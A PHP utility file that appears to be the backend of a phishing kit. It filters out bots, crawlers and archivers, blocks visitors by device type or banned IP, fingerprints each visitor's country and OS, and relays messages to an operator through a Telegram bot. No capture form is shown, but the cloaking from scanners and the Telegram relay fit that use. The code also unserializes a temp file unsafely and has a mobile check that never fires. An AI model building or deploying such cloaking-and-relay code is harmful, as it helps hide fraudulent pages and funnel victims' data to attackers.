<?php

define('MAX_REQUESTS', 30);
define('PER_SECONDS', 30);


$country_code =  getCountryCode();
$os = getOS();
$ip = getClientIP();


$timestamp = getCurrentTimestamp();


function getCurrentTimestamp() {
   return '[' . date('Y-m-d H:i:s') . ']';
}

function blockMobileDevices($block_mobile = true) {
   $mobile_keywords = array(
       'Mobile', 'Android', 'iPhone', 'iPad', 'Windows Phone',
       'webOS', 'BlackBerry', 'Opera Mini', 'Opera Mobi'
   );
   
   $user_agent = $_SERVER['HTTP_USER_AGENT'];
   
   $is_mobile = false;
   foreach ($mobile_keywords as $keyword) {
       if (stripos($user_agent, $keyword) !== false) {
           $is_mobile = true;
           break;
       }
   }
   
   if ($block_mobile && $is_mobile) {
       header('HTTP/1.0 403 Forbidden');
       die('Mobile devices are not allowed to access this website.');
   }
}

function blockDesktopDevices($block_desktop = true) {
   $desktop_keywords = array(
       'Windows NT', 'Macintosh', 'Linux x86_64', 'Ubuntu',
       'Firefox/', 'Chrome/', 'Safari/'
   );
   
   $user_agent = $_SERVER['HTTP_USER_AGENT'];
   
   $is_desktop = false;
   foreach ($desktop_keywords as $keyword) {
       if (stripos($user_agent, $keyword) !== false) {
           $is_desktop = true;
           break;
       }
   }
   
   $mobile_keywords = array('Mobile', 'Android', 'iPhone', 'iPad');
   $has_mobile_indicators = false;
   foreach ($mobile_keywords as $keyword) {
       if (stripos($user_agent, $keyword) !== false) {
           $has_mobile_indicators = false; 
           break;
       }
   }
   
   $is_desktop = $is_desktop && !$has_mobile_indicators;
   
   if ($block_desktop && $is_desktop) {
       header('HTTP/1.0 403 Forbidden');
       die('Desktop devices are not allowed to access this website.');
   }
}




function getClientIP() {
   if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
       return $_SERVER['HTTP_CLIENT_IP'];
   } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
       return $_SERVER['HTTP_X_FORWARDED_FOR'];
   } else {
       return $_SERVER['REMOTE_ADDR'];
   }
}

function checkIP($banListPath, $errorPage) {
   $userIP = getClientIP();
   $bannedIPs = file($banListPath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
   
   if (in_array($userIP, $bannedIPs)) {
       header("Location: $errorPage");
       exit();
   }
}

function isBot() {
   if (!isset($_SERVER['HTTP_USER_AGENT'])) {
       return true; 
   }

   $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
   $bot_keywords = array('bot', 'crawler', 'spider', 'slurp', 'search', 'archive', 'harvest', 'scrape');

   foreach ($bot_keywords as $keyword) {
       if (strpos($user_agent, $keyword) !== false) {
           return true;
       }
   }



   return false;
}

function handleBlockedAccess($reason) {
   http_response_code(403);
   die("Access denied: " . $reason);
}



function getCountryCode() {
   $ip = $_SERVER['REMOTE_ADDR'];
   $url = "http://www.geoplugin.net/json.gp?ip=" . $ip;
   
   $ch = curl_init();
   curl_setopt_array($ch, [
       CURLOPT_URL => $url,
       CURLOPT_RETURNTRANSFER => true,
       CURLOPT_TIMEOUT => 5, 
       CURLOPT_CONNECTTIMEOUT => 3, 
   ]);
   
   $response = curl_exec($ch);
   $curlError = curl_error($ch);
   $curlErrno = curl_errno($ch);
   curl_close($ch);

   if ($response === false) {
       error_log("geoplugin.net API cURL Error ({$curlErrno}): {$curlError}");
       return 'Unknown';
   }

   $details = json_decode($response);
   
   if (json_last_error() !== JSON_ERROR_NONE || !isset($details->geoplugin_countryCode)) {
       error_log("geoplugin.net JSON decode error or missing countryCode: " . json_last_error_msg() . " Response: " . $response);
       return 'Unknown';
   }

   return $details->geoplugin_countryCode;
}

function csrf_token() {
   return '<input type="hidden" name="csrf_token" value="' . $_SESSION['token'] . '">';
}

function verify_csrf_token() {
   if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['token']) {
       handleBlockedAccess("Invalid CSRF token");
   }
}

function rateLimit($maxRequests = MAX_REQUESTS, $perSeconds = PER_SECONDS) {
   $ip = $_SERVER['REMOTE_ADDR'];
   $cacheFile = sys_get_temp_dir() . '/rate_limit_' . md5($ip);

   $current = time();
   $timestamps = file_exists($cacheFile) ? unserialize(file_get_contents($cacheFile)) : array();
   $timestamps = array_filter($timestamps, function($timestamp) use ($current, $perSeconds) {
       return $timestamp > ($current - $perSeconds);
   });

   if (count($timestamps) >= $maxRequests) {
       handleBlockedAccess("Rate limit exceeded");
   }

   $timestamps[] = $current;
   file_put_contents($cacheFile, serialize($timestamps), LOCK_EX);
}


function generateRandomString($length = 8) {
   return bin2hex(random_bytes($length));
}

function hashString($string, $salt = '') {
   return hash('sha256', $string . $salt);
}

function getUserInfo() {
   return [
       'ip' => $_SERVER['REMOTE_ADDR'],
       'os' => getOS(),
       'country_code' => getCountryCode()
   ];
}

function getOS() {
   $user_agent = $_SERVER['HTTP_USER_AGENT'];
   $os_array = [
       '/windows nt 10/i'     =>  'Windows 10',
       '/windows nt 6.3/i'    =>  'Windows 8.1',
       '/windows nt 6.2/i'    =>  'Windows 8',
       '/windows nt 6.1/i'    =>  'Windows 7',
       '/windows nt 6.0/i'    =>  'Windows Vista',
       '/windows nt 5.2/i'    =>  'Windows Server 2003/XP x64',
       '/windows nt 5.1/i'    =>  'Windows XP',
       '/windows xp/i'        =>  'Windows XP',
       '/macintosh|mac os x/i'=>  'Mac OS X',
       '/mac_powerpc/i'       =>  'Mac OS 9',
       '/linux/i'             =>  'Linux',
       '/ubuntu/i'            =>  'Ubuntu',
       '/iphone/i'            =>  'iPhone',
       '/ipod/i'              =>  'iPod',
       '/ipad/i'              =>  'iPad',
       '/android/i'           =>  'Android',
       '/blackberry/i'        =>  'BlackBerry',
       '/webos/i'             =>  'Mobile'
   ];

   foreach ($os_array as $regex => $value) {
       if (preg_match($regex, $user_agent)) {
           return $value;
       }
   }

   return 'Unknown OS Platform';
}



function appendToFile($file, $message) {
   file_put_contents($file, $message . PHP_EOL, FILE_APPEND | LOCK_EX);
}

function removeValueFromFile($file, $value) {
   $content = file_get_contents($file);
   $content = str_replace($value, '', $content);
   file_put_contents($file, $content, LOCK_EX);
}


function sendMessage($message, $replyMarkup = null, $replyToMessageId = null) {

   if (!defined('TOKEN') || !defined('CHATID')) {
       error_log("Telegram TOKEN or CHATID not defined in config.php. Please check your configuration.");
       return false;
   }

   $token = TOKEN;
   $chatId = CHATID;


   if (empty($token) || $token === 'YOUR_TELEGRAM_BOT_TOKEN') {
       error_log("Telegram TOKEN is empty or still a placeholder. Please update cortex/zebi/config.php with your actual bot token.");
       return false;
   }
   if (empty($chatId) || $chatId === 'YOUR_TELEGRAM_CHAT_ID') {
       error_log("Telegram CHATID is empty or still a placeholder. Please update cortex/zebi/config.php with your actual chat ID.");
       return false;
   }

   $urlParams = [
       'chat_id' => $chatId,
       'text' => $message,
       'parse_mode' => 'HTML'
   ];

   if ($replyMarkup !== null) {
       $urlParams['reply_markup'] = json_encode($replyMarkup);
   }

   if ($replyToMessageId !== null) {
       $urlParams['reply_to_message_id'] = $replyToMessageId;
   }

   $apiUrl = "https://api.telegram.org/bot{$token}/sendMessage";

   $ch = curl_init();
   curl_setopt_array($ch, [
       CURLOPT_URL => $apiUrl,
       CURLOPT_RETURNTRANSFER => true,
       CURLOPT_POST => true,
       CURLOPT_POSTFIELDS => http_build_query($urlParams),
       CURLOPT_TIMEOUT => 10, 
       CURLOPT_CONNECTTIMEOUT => 5, 
   ]);

   $response = curl_exec($ch);
   $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
   $curlError = curl_error($ch);
   $curlErrno = curl_errno($ch);
   curl_close($ch);

   if ($response === false) {
       error_log("Telegram API cURL Error ({$curlErrno}): {$curlError}. Check network connectivity or cURL setup.");
       return false;
   }

   $responseData = json_decode($response, true);

   if (json_last_error() !== JSON_ERROR_NONE) {
       error_log("Telegram API JSON decode error: " . json_last_error_msg() . ". Raw response: " . $response);
       return false;
   }

   if ($httpCode !== 200 || !isset($responseData['ok']) || $responseData['ok'] !== true) {
       error_log("Telegram API Error Response (HTTP {$httpCode}): " . print_r($responseData, true) . ". Check bot token and chat ID.");
       return false;
   }

   return $responseData;
}



if (!isset($_SESSION['token'])) {
   $_SESSION['token'] = bin2hex(random_bytes(32));
}

rateLimit();
